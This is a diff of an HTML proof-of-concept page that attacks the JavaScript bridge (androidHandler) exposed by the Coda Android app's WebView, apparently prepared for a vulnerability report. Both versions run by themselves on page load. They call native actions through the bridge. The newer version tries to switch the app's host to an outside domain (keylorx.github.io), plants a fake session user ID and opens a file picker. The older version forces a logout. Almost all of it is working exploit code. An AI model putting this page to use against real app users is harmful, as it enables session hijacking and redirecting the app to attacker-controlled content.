@@ -1,297 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coda WebWrapper Vulnerability PoC</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body {
-            font-family: 'Courier New', monospace;
-            background: linear-gradient(135deg, #1a1a1a 0%, #0d0d0d 100%);
-            color: #00ff00;
-            padding: 20px;
-            min-height: 100vh;
-        }
-        
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-        }
-        
-        header {
-            text-align: center;
-            margin-bottom: 30px;
-            border-bottom: 3px solid #00ff00;
-            padding-bottom: 20px;
-        }
-        
-        h1 {
-            font-size: 28px;
-            color: #00ff00;
-            text-shadow: 0 0 10px #00ff00;
-            margin-bottom: 10px;
-        }
-        
-        .subtitle {
-            color: #888;
-            font-size: 14px;
-        }
-        
-        .box {
-            border: 2px solid #00ff00;
-            border-radius: 5px;
-            padding: 15px;
-            margin: 15px 0;
-            background-color: rgba(0, 255, 0, 0.05);
-        }
-        
-        .box.success {
-            border-color: #00ff00;
-            background-color: rgba(0, 255, 0, 0.1);
-        }
-        
-        .box.error {
-            border-color: #ff0000;
-            background-color: rgba(255, 0, 0, 0.1);
-            color: #ff0000;
-        }
-        
-        .box.warning {
-            border-color: #ffaa00;
-            background-color: rgba(255, 170, 0, 0.1);
-            color: #ffaa00;
-        }
-        
-        .log-entry {
-            margin: 8px 0;
-            padding: 8px;
-            border-left: 3px solid #00ff00;
-            padding-left: 12px;
-        }
-        
-        .log-entry.error {
-            border-left-color: #ff0000;
-            color: #ff0000;
-        }
-        
-        .log-entry.warning {
-            border-left-color: #ffaa00;
-            color: #ffaa00;
-        }
-        
-        .log-entry.success {
-            border-left-color: #00ff00;
-            color: #00ff00;
-        }
-        
-        button {
-            background-color: #00ff00;
-            color: #000000;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 3px;
-            cursor: pointer;
-            font-weight: bold;
-            font-family: monospace;
-            margin: 5px;
-            transition: all 0.3s;
-        }
-        
-        button:hover {
-            background-color: #00dd00;
-            box-shadow: 0 0 10px #00ff00;
-        }
-        
-        button:active {
-            transform: scale(0.95);
-        }
-        
-        .divider {
-            height: 1px;
-            background: linear-gradient(to right, transparent, #00ff00, transparent);
-            margin: 20px 0;
-        }
-        
-        .footer {
-            text-align: center;
-            color: #666;
-            font-size: 12px;
-            margin-top: 30px;
-        }
-    </style>
+    <title>Coda App Exploit Test</title>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>🔴 CODA WEBWRAPPER VULNERABILITY PoC 🔴</h1>
-            <p class="subtitle">CWE-749: Insecure JavaScript Interface Exposure</p>
-        </header>
-
-        <div class="box">
-            <p>This page demonstrates the critical vulnerability in <code>io.coda.codaapp.WebWrapper</code></p>
-            <p style="margin-top: 10px;">The app exposes a JavaScript bridge without proper access controls.</p>
-        </div>
-
-        <div id="results"></div>
-
-        <div class="box">
-            <p><strong>Manual Test Buttons:</strong></p>
-            <button onclick="testBridge()">Test Bridge Existence</button>
-            <button onclick="testGetFeatures()">Call GetSupportedFeatures</button>
-            <button onclick="testAcceptNotif()">Call AcceptPushNotifications</button>
-            <button onclick="testStoreSession()">Call StoreSessionData (CRITICAL)</button>
-            <button onclick="testLogout()">Call Logout</button>
-            <button onclick="clearLog()">Clear Log</button>
-        </div>
-
-        <div class="footer">
-            <p>Report: Coda Android App - WebView JavaScript Interface Vulnerability</p>
-            <p>Severity: CRITICAL | CVSS: 8.2</p>
-        </div>
-    </div>
-
+    <h1>WebView JavaScript Interface Exploit</h1>
+    
     <script>
-        const resultsDiv = document.getElementById('results');
-
-        function log(msg, type = 'info') {
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            
-            // Add timestamp
-            const timestamp = new Date().toLocaleTimeString();
-            entry.textContent = `[${timestamp}] ${msg}`;
-            
-            resultsDiv.appendChild(entry);
-            resultsDiv.scrollTop = resultsDiv.scrollHeight;
-            
-            console.log(`[${type.toUpperCase()}] ${msg}`);
-        }
-
-        function clearLog() {
-            resultsDiv.innerHTML = '';
-            log('Log cleared', 'info');
-        }
-
-        // Auto-run tests on page load
-        window.addEventListener('load', function() {
-            log('Page loaded. Starting vulnerability assessment...', 'info');
-            setTimeout(autoRunTests, 1000);
-        });
-
-        function autoRunTests() {
-            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
-            log('AUTOMATIC VULNERABILITY TEST STARTED', 'warning');
-            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
-            
-            testBridge();
-            
-            setTimeout(() => {
-                if (typeof androidHandler !== 'undefined') {
-                    log('Bridge is VULNERABLE! Running payload tests...', 'warning');
-                    
-                    setTimeout(() => testGetFeatures(), 500);
-                    setTimeout(() => testAcceptNotif(), 1500);
-                    setTimeout(() => testStoreSession(), 2500);
-                    setTimeout(() => testLogout(), 3500);
-                    
-                    setTimeout(() => {
-                        log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
-                        log('🔴 VULNERABILITY CONFIRMED 🔴', 'warning');
-                        log('CWE-749: Insecure JavaScript Interface', 'warning');
-                        log('Impact: Arbitrary Android Native Code Execution', 'warning');
-                        log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'warning');
-                    }, 4500);
-                }
-            }, 1500);
-        }
-
-        function testBridge() {
-            log('TEST 1: Checking for androidHandler bridge...', 'info');
-            
+        function exploit() {
+            // Test 1: Check if we can access the Android interface
             if (typeof androidHandler !== 'undefined') {
-                log('✅ SUCCESS: androidHandler bridge is EXPOSED!', 'success');
-                log('This proves the vulnerability exists in the app!', 'success');
-                return true;
+                document.getElementById('status').innerHTML = '✅ VULNERABLE: androidHandler found!';
+                
+                // Test 2: Try to change host to your domain
+                try {
+                    var result = androidHandler.postMessage(JSON.stringify({
+                        "action": "changeHost",
+                        "newHost": "https://keylorx.github.io"
+                    }));
+                    console.log('Change host result:', result);
+                    document.getElementById('host-change').innerHTML = '✅ Host change attempted';
+                } catch(e) {
+                    console.error('Host change failed:', e);
+                }
+                
+                // Test 3: Try to access sensitive actions
+                try {
+                    // Attempt to navigate to notification settings
+                    androidHandler.postMessage(JSON.stringify({
+                        "action": "navigateToNotificationSettings"
+                    }));
+                    document.getElementById('notifications').innerHTML = '✅ Notification access attempted';
+                } catch(e) {
+                    console.error('Notification access failed:', e);
+                }
+                
+                // Test 4: Try to store session data
+                try {
+                    androidHandler.postMessage(JSON.stringify({
+                        "action": "storeSessionData",
+                        "userId": "hacked_user_123"
+                    }));
+                    document.getElementById('session').innerHTML = '✅ Session storage attempted';
+                } catch(e) {
+                    console.error('Session storage failed:', e);
+                }
+                
             } else {
-                log('❌ Bridge NOT found. (Not running in vulnerable Coda app?)', 'error');
-                return false;
+                document.getElementById('status').innerHTML = '❌ androidHandler not found';
             }
         }
-
-        function testGetFeatures() {
-            if (typeof androidHandler === 'undefined') {
-                log('❌ Bridge not available', 'error');
-                return;
-            }
-            
-            log('TEST 2: Calling GetSupportedFeatures...', 'info');
-            try {
-                const payload = JSON.stringify({ action: "GetSupportedFeatures" });
-                const response = androidHandler.postMessage(payload);
-                log('✅ GetSupportedFeatures executed', 'success');
-                log('Response: ' + response, 'success');
-            } catch (e) {
-                log('❌ Error: ' + e.message, 'error');
-            }
+        
+        // Test 5: Try file upload access
+        function testFileAccess() {
+            var input = document.createElement('input');
+            input.type = 'file';
+            input.multiple = true;
+            input.onchange = function(e) {
+                var files = e.target.files;
+                document.getElementById('file-access').innerHTML = '✅ File access: ' + files.length + ' files selected';
+            };
+            input.click();
         }
-
-        function testAcceptNotif() {
-            if (typeof androidHandler === 'undefined') {
-                log('❌ Bridge not available', 'error');
-                return;
-            }
-            
-            log('TEST 3: Calling AcceptPushNotifications...', 'info');
-            try {
-                const payload = JSON.stringify({ action: "AcceptPushNotifications" });
-                const response = androidHandler.postMessage(payload);
-                log('⚠️ AcceptPushNotifications executed', 'warning');
-                log('Response: ' + response, 'warning');
-            } catch (e) {
-                log('❌ Error: ' + e.message, 'error');
-            }
-        }
-
-        function testStoreSession() {
-            if (typeof androidHandler === 'undefined') {
-                log('❌ Bridge not available', 'error');
-                return;
-            }
-            
-            log('TEST 4: Calling StoreSessionData (CRITICAL)...', 'warning');
-            try {
-                const payload = JSON.stringify({
-                    action: "StoreSessionData",
-                    userId: "ATTACKER_CONTROLLED_ID_" + Date.now()
-                });
-                const response = androidHandler.postMessage(payload);
-                log('🔴 CRITICAL: StoreSessionData executed!', 'warning');
-                log('SESSION HIJACKING POSSIBLE!', 'warning');
-                log('Response: ' + response, 'warning');
-            } catch (e) {
-                log('❌ Error: ' + e.message, 'error');
-            }
-        }
-
-        function testLogout() {
-            if (typeof androidHandler === 'undefined') {
-                log('❌ Bridge not available', 'error');
-                return;
-            }
-            
-            log('TEST 5: Calling Logout...', 'info');
-            try {
-                const payload = JSON.stringify({ action: "Logout" });
-                const response = androidHandler.postMessage(payload);
-                log('⚠️ Logout executed', 'warning');
-                log('User would be forced to re-authenticate!', 'warning');
-                log('Response: ' + response, 'warning');
-            } catch (e) {
-                log('❌ Error: ' + e.message, 'error');
-            }
-        }
+    </script>
+    
+    <div id="status">Testing...</div>
+    <div id="host-change"></div>
+    <div id="notifications"></div>
+    <div id="session"></div>
+    <div id="file-access"></div>
+    
+    <button onclick="exploit()">Run Exploit</button>
+    <button onclick="testFileAccess()">Test File Access</button>
+    
+    <script>
+        // Auto-run exploit after page load
+        window.onload = function() {
+            setTimeout(exploit, 1000);
+        };
     </script>
 </body>
 </html>
